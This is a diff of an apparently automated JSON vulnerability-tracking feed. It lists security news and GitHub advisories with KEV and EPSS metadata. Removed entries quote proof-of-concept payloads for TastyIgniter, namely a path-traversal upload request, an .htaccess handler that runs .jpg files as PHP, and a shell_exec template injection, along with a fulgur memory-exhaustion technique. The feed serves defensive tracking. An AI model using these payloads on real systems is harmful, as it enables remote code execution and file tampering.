@@ -1,12 +1,12 @@
 {
-  "generated": "2026-11-26T15:55:29.868212+00:00",
-  "total": 13,
-  "kev": 4,
+  "generated": "2026-11-27T01:14:00.164441+00:00",
+  "total": 7,
+  "kev": 3,
   "zero_day": 3,
   "enriched": 0,
-  "high_epss": 1,
-  "my_stack": 7,
-  "run_id": "45853704446",
+  "high_epss": 0,
+  "my_stack": 3,
+  "run_id": "45921285149",
   "changes": [],
   "findings": [
     {
@@ -92,38 +92,6 @@
       "stack_match": []
     },
     {
-      "id": "https://aws.amazon.com/blogs/security/icymi-october-2026-aws-security/",
-      "title": "ICYMI: October 2026 @AWS Security",
-      "summary": "Welcome to this month\u2019s AWS Security news! Organizations need current information about AWS Security developments to maintain their cloud security. This monthly digest covers key AWS Security updates. Each month, we compile new announcements, features, and resources to help you improve your security. Based on AWS Security developments, you\u2019ll find expert perspectives in blogs, announcements [\u2026]",
-      "link": "https://aws.amazon.com/blogs/security/icymi-october-2026-aws-security/",
-      "published": "2026-11-25T23:04:26+00:00",
-      "source": "AWS Security Blog",
-      "tags": [
-        "cloud",
-        "aws",
-        "blog"
-      ],
-      "cve_ids": [
-        "CVE-2026-109618",
-        "CVE-2026-109619",
-        "CVE-2026-115560"
-      ],
-      "in_kev": true,
-      "kev_date_added": "2026-10-26",
-      "kev_due_date": "2026-10-29",
-      "kev_vendor": "PHP Group",
-      "kev_product": "PHP",
-      "kev_ransomware": false,
-      "is_zero_day": true,
-      "is_high_severity": true,
-      "is_priority_product": false,
-      "epss": 0.86584,
-      "epss_percentile": 0.99826,
-      "stack_match": [
-        "aws"
-      ]
-    },
-    {
       "id": "https://www.securityweek.com/mitel-micollab-zero-days-exploited-in-suspected-ai-assisted-attacks/",
       "title": "Mitel MiCollab Zero-Days Exploited in Suspected AI-Assisted Attacks",
       "summary": "Accenture says hackers exploited MiCollab flaws before Mitel\u2019s advisory, likely aided by AI, in a suspected extortion campaign. The post Mitel MiCollab Zero-Days Exploited in Suspected AI-Assisted Attacks appeared first on SecurityWeek .",
@@ -149,15 +117,15 @@
       "stack_match": []
     },
     {
-      "id": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-unpatched-flaw-in-danfoss-refrigeration-controllers/",
-      "title": "CISA warns of critical unpatched flaw in Danfoss refrigeration controllers",
-      "summary": "The U.S. Cybersecurity and Infrastructure Security Agency (CISA) is warning about a critical vulnerability in Danfoss AK-SM 8xxA Series controllers used by food retailers to manage commercial refrigeration, HVAC, and lighting systems. [...]",
-      "link": "https://www.bleepingcomputer.com/news/security/cisa-warns-of-critical-unpatched-flaw-in-danfoss-refrigeration-controllers/",
-      "published": "2026-11-25T16:13:40+00:00",
-      "source": "Bleeping Computer",
+      "id": "https://thehackernews.com/2026/11/threatsday-250-rogue-extensions-10m.html",
+      "title": "ThreatsDay: 10M NGINX Services at Risk, 250+ Malicious Extensions, AI Server Hijacking + 17 More Stories",
+      "summary": "A website can look perfectly fine to the person running it. Log out, visit the same page, and things might look different. Something similar is happening with browser extensions, where even the way you find and install one can change what it does. Checking whether software works as expected only tells you so much.\n\nThen there\u2019s the question of who gets to use what. Stolen logins are opening",
+      "link": "https://thehackernews.com/2026/11/threatsday-250-rogue-extensions-10m.html",
+      "published": "2026-11-26T19:39:57+00:00",
+      "source": "The Hacker News Security",
       "tags": [
         "news",
-        "malware"
+        "zeroday"
       ],
       "cve_ids": [],
       "in_kev": false,
@@ -167,11 +135,13 @@
       "kev_product": null,
       "kev_ransomware": false,
       "is_zero_day": true,
-      "is_high_severity": true,
+      "is_high_severity": false,
       "is_priority_product": false,
       "epss": null,
       "epss_percentile": null,
-      "stack_match": []
+      "stack_match": [
+        "nginx"
+      ]
     },
     {
       "id": "https://www.bleepingcomputer.com/news/security/remus-malware-steals-gmail-messages-via-fake-google-sheets-extension/",
@@ -233,160 +203,6 @@
       "epss_percentile": 0.9909,
       "stack_match": [
         "nginx"
-      ]
-    },
-    {
-      "id": "CVE-2026-69181",
-      "title": "TastyIgniter permits Path Traversal in Media Upload",
-      "summary": "### Summary\nArbitrary file write outside `media/uploads/`\n\n### Details\nIt is possible to perform Path Traversal in Media Manager file upload function as admin.\n\n\n### PoC\n- login as admin\n- upload a image but in the request, change the path from `/` to `/../../`.\n\nRequest\n```http\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 302\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nAccept: application/json\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/media_manager\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6InF4RFZUdStuQkY0cGRLU2s4NUFiQ1E9PSIsInZhbHVlIjoiUjMyRUp6UGI3ZFRsL0dhY3pDSUhtMDJaY3Y5bXZ6SFlkQVR5MzZzdGZOT2ZRdExFQ1FJRUh5NDVmQlV0d0tNUXRackcxbTh0YWcxbHphV3dmTVdrNjR5aExhdzZUUFdLQ1JsSEhiMUlZRE1IblBuTFhmdVJWZFc5bFpicU4vS1BUZDh5OGRUMERTU1dsOEdnZVp0bXNpUFI5ZWFPM29RaGl3czU0cnlKczFsN0U4OGFnRWNjREM3aWFSRUtaYTVVTkRmSkV4RXlzZGRiK3RRcGVmOVk2dG1ud0NBaXVFTDRHRVM0Nk9MWDNaUT0iLCJtYWMiOiJiZjA3OGVhMjZlZjQ5ZDczNDkxYmQ3NDBmYWFmNGI5NjNkZDFkMmI0ODAwMTU2MmE5MjMwNjJlMzU0OGM1ODg5IiwidGFnIjoiIn0%3D; XSRF-TOKEN=eyJpdiI6Ikt6a2dhWG1oL3p4",
-      "link": "https://github.com/advisories/GHSA-rj59-9f77-mvg5",
-      "published": "2026-11-25T22:54:30Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-69181"
-      ],
-      "in_kev": false,
-      "kev_date_added": null,
-      "kev_due_date": null,
-      "kev_vendor": null,
-      "kev_product": null,
-      "kev_ransomware": false,
-      "is_zero_day": false,
-      "is_high_severity": true,
-      "is_priority_product": false,
-      "epss": null,
-      "epss_percentile": null,
-      "stack_match": [
-        "linux",
-        "chrome",
-        "chromium"
-      ]
-    },
-    {
-      "id": "CVE-2026-69179",
-      "title": "TastyIgniter allows Remote Code Execution (RCE) via Unrestricted file upload in Media Manager",
-      "summary": "### Summary\nMedia manager accepts `.htaccess` file which can be used to perform RCE.\n\n### Details\nThe file upload functionality from media manager somehow accepts `.htaccess` file. This file could be used to allow any extension to run PHP command. By doing so, it is possible to perform RCE.\n\n### PoC\n- Login as Admin\n- Create a `.htaccess` file with the following code.\n\n```\n<FilesMatch \"\\.jpg$\">\n    SetHandler application/x-httpd-php\n</FilesMatch>\n```\n- Upload the `.htaccess` file via the Media Manager.\n\nRequest\n```\nPOST /admin/media_manager HTTP/1.1\nHost: localhost:8888\nContent-Length: 357\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: 2vv3ZKpvfj2SkbbJzqmf8G053mNXqPLktxqd5eMx\nCache-Control: no-cache\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-IGNITER-FILEUPLOAD: mediamanager\nX-Requested-With: XMLHttpRequest\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nAccept: application/json\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryN13ytndlhtodIsbE\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/media_manager\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6InF4RFZUdStuQkY0cGRLU2s4NUFiQ1E9PSIsInZhbHVlIjoiUjMyRUp6UGI3ZFRsL0dhY3pDSUhtMDJaY3Y5bXZ6SFlkQVR5MzZzdGZOT2ZRdExFQ1FJRUh5NDVmQlV0d0tNUXRackcxbTh0YWcxbHphV3dmTVdrNjR5aExhdzZUUFdLQ1JsSEhiMUlZRE1IblBuTFhmdVJWZFc5bFpicU4vS1BUZDh5OGRUMERTU1dsOEdnZVp0bXNpUFI5ZWFPM29RaGl3czU0cnlKcz",
-      "link": "https://github.com/advisories/GHSA-7wwv-x6mc-pxqx",
-      "published": "2026-11-25T22:24:36Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-69179"
-      ],
-      "in_kev": false,
-      "kev_date_added": null,
-      "kev_due_date": null,
-      "kev_vendor": null,
-      "kev_product": null,
-      "kev_ransomware": false,
-      "is_zero_day": false,
-      "is_high_severity": true,
-      "is_priority_product": false,
-      "epss": null,
-      "epss_percentile": null,
-      "stack_match": [
-        "linux",
-        "chrome",
-        "chromium"
-      ]
-    },
-    {
-      "id": "CVE-2026-69178",
-      "title": "TastyIgniter mail template editor allows remote code execution via server-side template injection",
-      "summary": "### Summary\n**Where:** `POST /admin/mail_templates/edit/{id}` \u2192 body field  \n**Who can trigger:** Any admin user with `Admin.MailTemplates` permission  \n**Impact:** Arbitrary PHP execution on the server \u2014 full RCE\n\n### Details\nThe Mail templates is vulnerable to SSTI and did not perform an validation and sanitization.\n\n### PoC\n\n- login as admin\n- create new mail template with following command\n\n```\n@php echo shell_exec('echo \"RCE Executed\";id'); @endphp\n```  \n\n- save the request\n- execute the request using `X-IGNITER-REQUEST-HANDLER: onTestTemplate`\n\nRequest\n```http\nPOST /admin/mail_templates/edit/20 HTTP/1.1\nHost: localhost:8888\nContent-Length: 47\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36\nsec-ch-ua-platform: \"Linux\"\nX-CSRF-TOKEN: L22Pxu6L5hHmHgoC4RB1Zz5Py16muXvsRIOBtxuY\nAccept-Language: en-US,en;q=0.9\nsec-ch-ua: \"Not-A.Brand\";v=\"24\", \"Chromium\";v=\"146\"\nsec-ch-ua-mobile: ?0\nX-Requested-With: XMLHttpRequest\nX-IGNITER-REQUEST-PARTIALS: \nAccept: */*\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-IGNITER-REQUEST-HANDLER: onTestTemplate\nOrigin: http://localhost:8888\nSec-Fetch-Site: same-origin\nSec-Fetch-Mode: cors\nSec-Fetch-Dest: empty\nReferer: http://localhost:8888/admin/mail_templates/edit/20\nAccept-Encoding: gzip, deflate, br\nCookie: laravel_session=eyJpdiI6IkxRY3hrdXkyY01mN3RONXZwNjlDRnc9PSIsInZhbHVlIjoibkZSNHNWWW5hTDZtWXpIbmdnUkM0aFJZZFJRM2V5czVXWUd6TkxwUVFhUUplVGNuY3B5Z1NKZk9TMlc1R1c3akhoakpaUE9MM0ZUcW5tclBtZi80ZXExR3hpUm5hOU40UDl0NWNSWUpNUmNmU043Qmx4aEk4ZWxQQnZUanBPUHoiLCJtYWMiOiI5YmRkMGQ0M2I5M2EzYzRmNGJjOGU5ODhkY2M2MmU1MmI0ODYzYjc5YjQ2OTIzY2Y2NDJiZTRhZDBmOTQyNDUwIiwidGFnIjoiIn0%3D; remember_igniter-admin_d89cc32487145546aea44c0efb53f29c32adfc35=eyJpdiI6IjhvRGwrR1drU2JrTEhqcHh6QlNRdFE9PSIsInZhbHVlIjoiT2dpbUpNMGZkZzZUNVNZTFkyOFJtc25sZ2FXR3NxQ3JLMFBWUk5wNnl2WWtaNlpsNnBDYldFNkpMbEFKeVhnbjZWQW1MZzZPT3NjNlV0V3l5Z1NMVG9jamNFK0dzbFA4LzZhREFSNFFHQVNSTmJYOEFiOG0rZ0s2T1VQVmdCTlNrMVZ2dH",
-      "link": "https://github.com/advisories/GHSA-743w-g9pf-8p94",
-      "published": "2026-11-25T22:24:13Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-69178"
-      ],
-      "in_kev": false,
-      "kev_date_added": null,
-      "kev_due_date": null,
-      "kev_vendor": null,
-      "kev_product": null,
-      "kev_ransomware": false,
-      "is_zero_day": false,
-      "is_high_severity": true,
-      "is_priority_product": false,
-      "epss": null,
-      "epss_percentile": null,
-      "stack_match": [
-        "linux",
-        "chrome",
-        "chromium"
-      ]
-    },
-    {
-      "id": "CVE-2026-68539",
-      "title": "fulgur allows Unbounded string-set value accumulation causes memory/CPU exhaustion (denial of service)",
-      "summary": "`fulgur` converts untrusted HTML/CSS into PDF, commonly on a server that\nprocesses input supplied by many tenants. In versions from 0.4.4 up to (but not\nincluding) the patched release, the CSS `string-set` named-string values\nresolved from a document were accumulated per element with no memory budget,\nletting a small crafted document amplify into large retained memory (and the CPU\nto copy it) \u2014 a denial of service.\n\nA `string-set` value is attacker-controlled: it is resolved from an element's\nown text (`content(text)`), from one of its attributes (`attr(...)`), or from a\nCSS string literal. fulgur accumulated these values per element in two unbounded\nplaces:\n\n1. **Store (default path).** For every element that matches a `string-set` rule,\n   fulgur pushes a copy of the resolved value into a store that is retained for\n   the whole render and cloned again downstream into a per-node lookup map. This\n   happens on the ordinary render path with no opt-in. A single literal reused\n   across many elements therefore expands from one copy in the input to N copies\n   in memory:\n\n   ```html\n   <style>\n     p { string-set: title \"\u2026\u2026a large literal value\u2026\u2026\" }\n   </style>\n   <p></p>  <!-- repeated N times -->\n   ```\n\n   The store grows to roughly `value_size \u00d7 N` bytes (and ~3\u00d7 that across the\n   downstream clones) from an input whose large part appears only once \u2014 a\n   breadth-unbounded amplification.\n\n2. **Per-node snapshot (bookmark / cross-reference path).** When PDF bookmarks\n   (`bookmark-label: string(...)`) or CSS `target-*` references are in play,\n   fulgur additionally cloned the full running `name \u2192 value` map at every\n   visited element so `string()` can resolve at that position. One large value\n   is then re-cloned at each of N following elements \u2014 an `O(N \u00d7 value_size)`\n   retained-memory sink. This is the string counterpart of the counter-snapshot\n   sink fixed in\n   [GHSA-395p-pj7r-jm42](https://github.com/fulgur-rs/fulgur/security/advisories/GHSA-395p-pj7r-jm42);\n",
-      "link": "https://github.com/advisories/GHSA-vw2v-g4x7-xcqg",
-      "published": "2026-11-25T19:46:45Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-68539"
-      ],
-      "in_kev": false,
-      "kev_date_added": null,
-      "kev_due_date": null,
-      "kev_vendor": null,
-      "kev_product": null,
-      "kev_ransomware": false,
-      "is_zero_day": false,
-      "is_high_severity": true,
-      "is_priority_product": false,
-      "epss": 0.00684,
-      "epss_percentile": 0.47787,
-      "stack_match": []
-    },
-    {
-      "id": "CVE-2026-65973",
-      "title": "laradocs  Command injection via unescaped Node.js binary path in KaTeX SSR",
-      "summary": "### Summary\nLocal command injection (CWE-78) in server-side KaTeX rendering via an unescaped Node.js binary path in a `proc_open()` command string.\n\n### Affected versions\n>= 0.4.0, < 1.0.0\n\n### Patched versions\n>= 1.0.0 (fixed in commit `100cb1e`)\n\n### Impact\nWhen rendering KaTeX math **server-side**, Laradocs invoked Node via `proc_open()` with a command string in which the Node binary argument was not passed through `escapeshellarg()`.\n\n`MarkdownPipelineFactory` constructs `KatexExtension` with the configured binary, which the render path resolved as:\n\n```php\n$node = $this->nodeBin ?? 'node';\n$cmd = $node . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);\n```\n\n`$this->nodeBin` comes from `Config::nullableString('laradocs.parser.katex.node_bin')`. Both possible sources \u2014 the configured `node_bin` value, or the `'node'` default resolved from `PATH` \u2014 are operator-controlled. Neither is derived from untrusted request data or documentation content.\n\nThe vulnerable branch is reached only when server-side rendering is enabled. The default KaTeX path is client-side (browser-rendered via the configured `js`/`css` assets) and never calls `proc_open()`. SSR is opt-in via `laradocs.parser.katex.ssr`, which ships **disabled**.\n\n### Exploit scenario\nExploitation requires SSR to be turned on **and** an untrusted party to control `laradocs.parser.katex.node_bin` or the process `PATH` \u2014 a precondition that on its own already implies code execution on the host.\n\n### Severity\n**Low.** This is best treated as a hardening / defence-in-depth fix rather than a remotely exploitable RCE, since no untrusted input (request data, documentation content, or network input) reaches the vulnerable code path under normal operation.\n\n### Patch\nThe Node binary argument is now passed through `escapeshellarg()` like the other command components:\n\n```php\n$cmd = escapeshellarg($node) . ' ' . escapeshellarg($tmpFile) . ' ' . escapeshellarg($input);\n```\n\n### Credit\nReported via automated se",
-      "link": "https://github.com/advisories/GHSA-h746-qpxh-ph7g",
-      "published": "2026-11-25T19:41:53Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-65973"
-      ],
-      "in_kev": false,
-      "kev_date_added": null,
-      "kev_due_date": null,
-      "kev_vendor": null,
-      "kev_product": null,
-      "kev_ransomware": false,
-      "is_zero_day": false,
-      "is_high_severity": true,
-      "is_priority_product": false,
-      "epss": 0.0063,
-      "epss_percentile": 0.44648,
-      "stack_match": [
-        "node.js"
       ]
     }
   ]
